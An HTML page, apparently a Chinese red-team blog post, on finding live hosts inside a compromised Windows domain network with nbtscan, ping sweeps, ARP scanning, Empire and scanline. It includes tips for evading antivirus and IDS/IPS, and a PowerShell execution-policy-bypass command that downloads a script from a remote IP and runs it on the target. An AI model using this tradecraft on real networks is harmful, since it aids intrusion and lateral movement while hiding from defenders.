@@ -1,0 +1,565 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta http-equiv="X-UA-Compatible" content="ie=edge" />
+    <title>域渗透笔记 信息收集（二） | rebootORZ Security</title>
+
+    
+<link href="favicon.ico" rel="shortcut icon" type="image/x-icon" />
+
+
+
+
+<meta name="author" content="rebootORZ" />
+<meta name="description" content="域渗透笔记-信息收集（二） 简述: 在做内网横向前，我们需要先知道内网有哪些主机，他们是什么系统，开放了哪些端口，运行了什么服务，这都决定了我们" />
+
+
+
+<meta name="generator" content="Hugo 0.101.0" />
+
+<link rel="canonical" href="https://rebootorz.github.io/posts/%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%BA%8C/" />
+
+
+<meta property="og:title" content="域渗透笔记 信息收集（二）" />
+<meta property="og:description" content="域渗透笔记-信息收集（二） 简述: 在做内网横向前，我们需要先知道内网有哪些主机，他们是什么系统，开放了哪些端口，运行了什么服务，这都决定了我们" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://rebootorz.github.io/posts/%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%BA%8C/" /><meta property="og:image" content="https://rebootorz.github.io/me/background.jpg"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2022-07-05T17:39:32+08:00" />
+<meta property="article:modified_time" content="2022-07-05T17:39:32+08:00" />
+
+
+
+
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://rebootorz.github.io/me/background.jpg"/>
+
+<meta name="twitter:title" content="域渗透笔记 信息收集（二）"/>
+<meta name="twitter:description" content="域渗透笔记-信息收集（二） 简述: 在做内网横向前，我们需要先知道内网有哪些主机，他们是什么系统，开放了哪些端口，运行了什么服务，这都决定了我们"/>
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/semantic-ui@2.4.2/dist/semantic.min.css" integrity="sha256-UXesixbeLkB/UYxVTzuj/gg3+LMzgwAmg3zD+C4ZASQ=" crossorigin="anonymous">
+<link rel="stylesheet" href="/css/icomoon.css" />
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/overlayscrollbars@1.13.1/css/OverlayScrollbars.min.css" integrity="sha256-WKijf8KI68sbq8Znd6yMepIuFF0wdWfIt6gk3JWcQfk=" crossorigin="anonymous">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css">
+<link rel="stylesheet" href="/css/site.css" />
+
+<style>
+  .ui.header a:not(.item, .ui.button):hover {
+    text-decoration: underline;
+  }
+
+  
+  a:not(.item, .ui.button) {
+    color: seagreen !important;
+  }
+  
+
+  
+  .inverted a:not(.item, .ui.button) {
+     color: darkseagreen !important;
+  }
+  
+
+  
+  body.default {
+    
+    background-color: #fff;
+    
+
+    
+    background-image: url(/me/black_background.jpg);
+    
+  }
+  
+
+  
+  body.dark {
+    
+
+    
+    background-image: url(/me/light_background.jpeg);
+    
+  }
+  
+</style>
+
+
+    
+
+
+
+
+
+
+
+    
+    <link rel="stylesheet" href="/css/custom.css" />
+    
+  </head>
+
+  <body class="default">
+    
+<nav class="ui secondary menu dream-menu dream-nav">
+
+  <a class="item dream-flip-toggle" title="翻转！">
+    <i class="large link bullseye icon"></i>
+  </a>
+  <a class="item" href="https://rebootorz.github.io" title="首页">
+    <i class="large link home icon"></i>
+  </a>
+  
+  <a class="item" onclick="themeSwitch(event)">
+    <i class="large link icon theme-switch"></i>
+  </a>
+  
+  
+  <a class="item" title="搜索" onclick="toggleSearch(event)">
+    <i class="large link search icon"></i>
+  </a>
+  
+</nav>
+
+    <div class="flip-container">
+      <div class="flipper">
+        <section class="front">
+          <div class="dream-max-width">
+            
+<div class="ui relaxed centered grid dream-grid dream-grid-single">
+  
+  
+  
+  
+
+  
+  <aside class="sixteen wide mobile sixteen wide tablet three wide computer column dream-single-aside">
+    
+    <div class="ui segment toc">
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#域渗透笔记-信息收集二">域渗透笔记-信息收集（二）</a></li>
+  </ul>
+</nav>
+    </div>
+    
+
+    
+  </aside>
+  
+  <div class="sixteen wide mobile sixteen wide tablet ten wide computer column markdown-body dream-single" id="dream-save-post-as-img">
+    <section class="ui segment">
+      <header>
+        <h1 class="ui large header">域渗透笔记 信息收集（二）<span class="sub header">
+            <span class="left">
+              @
+              
+                
+                  rebootORZ
+                
+              
+
+              | 
+                  <span data-format="luxon">2022-07-05T17:39:32&#43;08:00</span>
+                
+
+              | 3 分钟阅读
+
+              
+              | 更新于
+                
+                  <span data-format="luxon">2022-07-05T17:39:32&#43;08:00</span>
+                
+              
+            </span>
+
+            
+            <span class="dream-share">
+  <a href="#" class="save-as-image" title="保存为图片" onclick="savePostAsImg()">
+    <i class="save icon"></i>
+  </a>
+  <a href="https://twitter.com/intent/tweet?text=%e5%9f%9f%e6%b8%97%e9%80%8f%e7%ac%94%e8%ae%b0%20%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86%ef%bc%88%e4%ba%8c%ef%bc%89&url=https%3a%2f%2frebootorz.github.io%2fposts%2f%25E5%259F%259F%25E6%25B8%2597%25E9%2580%258F%25E7%25AC%2594%25E8%25AE%25B0-%25E4%25BF%25A1%25E6%2581%25AF%25E6%2594%25B6%25E9%259B%2586%25E4%25BA%258C%2f" title="Twitter">
+    <i class="twitter icon"></i>
+  </a>
+  <a href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2frebootorz.github.io%2fposts%2f%25E5%259F%259F%25E6%25B8%2597%25E9%2580%258F%25E7%25AC%2594%25E8%25AE%25B0-%25E4%25BF%25A1%25E6%2581%25AF%25E6%2594%25B6%25E9%259B%2586%25E4%25BA%258C%2f" title="Facebook">
+    <i class="facebook icon"></i>
+  </a>
+</span>
+
+            
+          </span>
+        </h1>
+      </header>
+
+      <article class="main">
+        
+
+        <h2 id="域渗透笔记-信息收集二">域渗透笔记-信息收集（二）</h2>
+<p>简述:</p>
+<p>在做内网横向前，我们需要先知道内网有哪些主机，他们是什么系统，开放了哪些端口，运行了什么服务，这都决定了我们下一阶段的行动方向。今天这篇是存活主机探测。</p>
+<p>关键字：存活、端口、服务</p>
+<p>存活主机探测</p>
+<p>1.Nbtscan</p>
+<p>命令：</p>
+<p>nbtscan.exe IP</p>
+<p>扫描结果说明：</p>
+<p>SHARING:该主机有运行文件和打印共享服务，但不一定有内容共享</p>
+<p>IIS：该主机可能安装了IIS服务器</p>
+<p>NOTES：该主机可能安装了IBM的Lotus Notes-电子邮件客户端</p>
+<p>DC：该主机可能是域控制器</p>
+<p>U=USER：该主机可能存在USER用户（不太准）</p>
+<p>？：没有识别处该主机NETBIOS资源，可以使用-f参数再次进行扫描</p>
+<p><img src="/imgs/0.4267462029013236-20220428154804-fpojgig.png" alt="image"></p>
+<p>有时候上传工具时为了避免立马被杀，可以选择对文件名进行修改、加密码压缩，避免因文件名特征太明显被杀。</p>
+<p>注意事项：</p>
+<p>(1)在内网应尽量避免使用NAMP这种暴力类的工具 ，容易报警，也不要使用图形化工具。</p>
+<p>(2)在内网探测时推荐使用基于netbios协议的扫描器，因为他扫描时的探测方式会被ids/ips当做正常的连接</p>
+<p>(3)nbtscan可以很好的规避ids\ips的查杀。</p>
+<p>(4)建议使用系统自带的工具，例如，WIN7以上系统，建议使用PS（powershell）脚本，WIN7以下的系统建议使用VBS脚本。</p>
+<p>探测小技巧：</p>
+<p>（1）对不同时间段进行探测，排除个人PC的干扰。</p>
+<p>（2）一般推荐将要用的工具放到C:\Windows\temp文件夹下。</p>
+<p>（3）扫描结果右边的内容对应上面“扫描结果说明”</p>
+<p>2.icmp</p>
+<p>使用命令：</p>
+<p>for /L %a in (1,1,254) DO @ping -w 1 -n 1 192.168.1.%a | findstr &ldquo;TTL&rdquo;</p>
+<p><img src="/imgs/0.08924914748971594-20220428154804-dpbdmxq.png" alt="image"></p>
+<p>注:</p>
+<p>（1）用的时候需要修改IP段。</p>
+<p>（2）命令中的‘a’是用来控制循环的，只要前后两个&rsquo;a&rsquo;一致即可，不一定要用&rsquo;a&rsquo;。</p>
+<p>（3）ping不通只代表icmp协议不同，不代表其他协议不通，不能轻易就认为不存活。</p>
+<p>使用icmp.vbs</p>
+<p>使用icmp.vbs进行探测，使用时需要修改脚本中的IP地址</p>
+<p><img src="/imgs/0.5075845429898456-20220428154804-ntnt9k5.png" alt="image"></p>
+<p>如果在命令后门加 /b 则会在后台运行</p>
+<p>默认会创建一个记录结果的文件：</p>
+<p>C:\Windows\Temp\Result.txt</p>
+<p><img src="/imgs/0.11261856023219587-20220428154804-etui57t.png" alt="image"></p>
+<p><img src="/imgs/0.7726915097559269-20220428154804-bvo10za.png" alt="image"></p>
+<p>3.arp（非系统自带）</p>
+<p>arp-scan.exe</p>
+<p>命令：</p>
+<p>arp-scan.exe -t 192.168.10.0/24</p>
+<p><img src="/imgs/0.27417507316398-20220428154804-z2r7hz3.png" alt="image"></p>
+<p>powershell脚本</p>
+<p>例如：Invoke-ARPScan.ps1</p>
+<p>用的时候命令中的IP自行修改</p>
+<p>powershell.exe -exec bypass -Command &ldquo;&amp; {Import-Module C:\Windows\temp\Invoke-ARPScan.ps1;Invoke-ARPScan -CIDR 192.168.10.0/24}&rdquo; &raquo;C:\Windows\temp\log.txt</p>
+<p><img src="/imgs/0.49424867908825987-20220428154804-65cam2g.png" alt="image"></p>
+<p>命令运行结束会在C:\Windows\temp\log.txt生成结果文件，可根据需要进行修改</p>
+<p><img src="/imgs/0.72784178529024-20220428154804-6ybl89l.png" alt="image"></p>
+<p>Empire中的arpscan模块</p>
+<p>使用这个工具需要现在该工具上有一个agent(会话shell，类似metepreter)</p>
+<p>然后执行：</p>
+<p><img src="/imgs/0.473268139314581-20220428154804-ku8z8it.png" alt="image"></p>
+<p>use powershell/situational_awareness/network/arpscan set Range 192.168.10.0/24 set Agent WEDYPZCR(前面执行agents时列出的会话Name) execute</p>
+<p><img src="/imgs/0.6492509187305742-20220428154804-g4jbjdi.png" alt="image"></p>
+<p>(Valid resutls列出的就是存活的)</p>
+<p>4.Scanline</p>
+<p>scanline -h -t 22,80-89,110,389,445,3389,1099,1433,2049,6379,7001,8080,1521,3306,5432 -u 53,161,137,139 -O C:\Windows\temp\log.txt -p 192.168.10.1-254 /b -t tcp -u udp /b 后台运行</p>
+<p><img src="/imgs/0.6601352893062227-20220428154804-0ho3wnt.png" alt="image"></p>
+<p><img src="/imgs/0.5690346009310162-20220428154804-dfu5hbu.png" alt="image"></p>
+<p>5.arp(系统自带)</p>
+<p>通过系统自带的arp命令可以用来发现部分存活主机：</p>
+<p>arp -a 查看进行过通信的内网主机 这个命令windows、linux通用</p>
+<p><img src="/imgs/0.3717284443360082-20220428154804-7gg5yif.png" alt="image"></p>
+<p>工具上传（下载到目标机）</p>
+<p>前面说的点有些需要自行上传工具的，可以自行根据实际情况选择下载方式，例如：</p>
+<p>FTP、WEB、直接复制代码进行编译运行等。这里提供一个powershell的方式：</p>
+<p>从远程服务器上下载ps脚本而后进行运行。</p>
+<p>powershell -nop -exec bypass -c &ldquo;IEX (New-Object New.WebClient).DownloadString(&lsquo;http://119.XX.XXX.67/Invoke-ARPScan.ps1&rsquo;);Invoke-ARPScan -CIDR 192.168.10.0/24&rdquo; &raquo; C:\Windows\temp\log.txt</p>
+<p>注：</p>
+<p>（1）命令中文件下载、保存路径根据实际进行修改</p>
+<p>（2）bypass这个方法是微软提供的用来绕过执行策略的一种方式。当指定该标志后，即视为什么都不做，什么警告也不提示。</p>
+
+      </article>
+    </section>
+
+    
+
+    
+
+    
+  </div>
+</div>
+
+
+            <footer class="ui basic center aligned segment" style="background-color: transparent;">
+              
+              <p>© 2021 - 2022 rebootORZ Security</p>
+              
+
+              <p>Powered by <a href="https://gohugo.io/" target="_blank">Hugo</a> with theme <a href="https://github.com/g1eny0ung/hugo-theme-dream" target="_blank">Dream</a>.</p>
+
+              
+            </footer>
+          </div>
+        </section>
+        <section class="back">
+          <div class="dream-max-width">
+            <header class="ui basic very padded segment dream-header">
+  
+  <div class="ui small circular image">
+    <img src="/me/gl.jpg" alt="avatar" />
+  </div>
+  
+
+  <div class="content">
+    <h1 class="ui medium header">rebootORZ Security , EXP Loading ...<span class="sub header">🦶走过的叫足迹 ，走不到叫憧憬。</span>
+    </h1>
+
+    <article class="ui horizontal list">
+      
+      <a class="item" href="/posts">
+        <i class="archive icon" title="归档"></i>
+      </a>
+      
+      <a class="item" href="/categories">
+        <i class="th list icon" title="所有分类"></i>
+      </a>
+      <a class="item" href="/tags">
+        <i class="tags icon" title="所有标签"></i>
+      </a>
+    </article>
+
+    
+    
+    
+    
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+    
+
+    
+
+    
+    
+    
+          <div class="dream-tags">
+          
+          
+          
+            <a class="ui label" href="/tags/docker/" title="Docker">
+              Docker
+            </a>
+          
+          
+          
+            <a class="ui label" href="/tags/java/" title="java">
+              java
+            </a>
+          
+          
+          
+            <a class="ui label" href="/tags/jsp/" title="jsp">
+              jsp
+            </a>
+          
+          
+          
+            <a class="ui label" href="/tags/springboot/" title="SpringBoot">
+              SpringBoot
+            </a>
+          
+          
+          
+            <a class="ui label" href="/tags/webshell/" title="webshell">
+              webshell
+            </a>
+          
+          
+          
+            <a class="ui label" href="/tags/wifi/" title="WiFi">
+              WiFi
+            </a>
+          
+          
+          
+            <a class="ui label" href="/tags/%E7%BA%A2%E9%98%9F%E6%8A%80%E6%9C%AF/" title="红队技术">
+              红队技术
+            </a>
+          
+          
+          
+            <a class="ui label" href="/tags/%E8%93%9D%E7%89%99/" title="蓝牙">
+              蓝牙
+            </a>
+          
+          </div>
+    
+
+    
+  </div>
+</header>
+
+
+<div class="ui relaxed grid dream-grid dream-back">
+  
+  
+  
+
+  <div class="sixteen wide mobile eight wide tablet four wide computer column dream-column">
+    <article class="ui segment">
+      <div class="ui medium header">社交链接</div>
+      <nav class="ui secondary menu dream-menu dream-socials">
+  
+  <a class="item" href="/index.xml">
+    <i class="large rss square icon" title="RSS"></i>
+  </a>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+  <a class="item" href="https://github.com/https://github.com/rebootORZ/" target="_blank">
+    <i class="large github icon" title="GitHub"></i>
+  </a>
+  
+
+  
+
+  
+
+  
+</nav>
+
+    </article>
+  </div>
+
+  <div class="sixteen wide mobile eight wide tablet four wide computer column dream-column">
+    
+    <article class="ui segment">
+      <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/"><img alt="知识共享许可协议" style="border-width:0" src="https://i.creativecommons.org/l/by-nc-sa/4.0/88x31.png" /></a><br />本作品采用<a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议</a>进行许可。<br /><br />背景使用了 <a href="https://www.pexels.com/zh-cn/" target="_blank">Pexels</a> 上 <a href="https://www.pexels.com/zh-cn/@minan1398" target="_blank">Min An</a> 拍摄的<a href="https://www.pexels.com/zh-cn/photo/1454794/" target="_blank">图片</a>。
+    </article>
+    
+  </div>
+
+  
+</div>
+
+          </div>
+        </section>
+      </div>
+    </div>
+
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script>
+    <script src="https://cdn.jsdelivr.net/npm/semantic-ui@2.4.2/dist/semantic.min.js" integrity="sha256-CgSoWC9w5wNmI1aN8dIMK+6DPelUEtvDr+Bc2m/0Nx8=" crossorigin="anonymous"></script>
+
+    
+    <div class="ui segment" id="dream-search">
+  <div class="ui search">
+    <div class="ui transparent input">
+      <input class="prompt" type="text" placeholder="搜索" />
+    </div>
+    <div class="results"></div>
+  </div>
+</div>
+<script>
+  $(document).ready(function () {
+    $.getJSON('https:\/\/rebootorz.github.io/index.json', function (data) {
+      $('.ui.search').search({
+        source: data,
+        searchFields: ['title'],
+        showNoResults: false,
+      })
+    })
+  })
+</script>
+<script src="/js/search.js"></script>
+
+    
+
+    
+
+    <script>
+  window.background = "#fff"
+  window.defaultDark =  null 
+  window.backgroundDark =  null 
+  window.backgroundImageDark = "/me/light_background.jpeg"
+  window.darkNav =  true 
+  window.maxTags =  null 
+  window.hasTwitterEmbed =  null 
+  window.fixedNav =  null 
+
+  if (window.hasTwitterEmbed) {
+    
+    window.twttr = (function (d, s, id) {
+      var js,
+        fjs = d.getElementsByTagName(s)[0],
+        t = window.twttr || {}
+      if (d.getElementById(id)) return t
+      js = d.createElement(s)
+      js.id = id
+      js.src = 'https://platform.twitter.com/widgets.js'
+      fjs.parentNode.insertBefore(js, fjs)
+
+      t._e = []
+      t.ready = function (f) {
+        t._e.push(f)
+      }
+
+      return t
+    })(document, 'script', 'twitter-wjs')
+  }
+</script>
+<script src="https://cdn.jsdelivr.net/npm/overlayscrollbars@1.13.1/js/jquery.overlayScrollbars.min.js" integrity="sha256-tBd38uWlvgfps3zHPrUb2ePBg+Z8EjMf0QloFONzpvU=" crossorigin="anonymous"></script>
+<script src="/js/header.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/theme.js"></script>
+
+    
+
+
+<script src="https://cdn.jsdelivr.net/npm/luxon@1.26.0" integrity="sha256-4sbTzmCCW9LGrIh5OsN8V5Pfdad1F1MwhLAOyXKnsE0=" crossorigin="anonymous"></script>
+<script>
+  format()
+
+  function format() {
+    $('span[data-format="luxon"]').each(function () {
+      var date = $(this).text()
+
+      $(this).text(luxon.DateTime.fromISO(date, { locale: "zh" }).toFormat("yyyy年MM月dd日"))
+    })
+  }
+</script>
+
+
+
+<script src="/js/scrollToTop.js"></script>
+
+
+
+<script src="https://cdn.jsdelivr.net/npm/html2canvas@1.0.0-rc.1/dist/html2canvas.min.js" integrity="sha256-uacRffSSMP9qpvNWhVmYLykBv9YKMA1d/VSIN1AmfyQ=" crossorigin="anonymous"></script>
+<script src="/js/post.js" defer></script>
+
+
+    
+
+    
+  </body>
+</html>
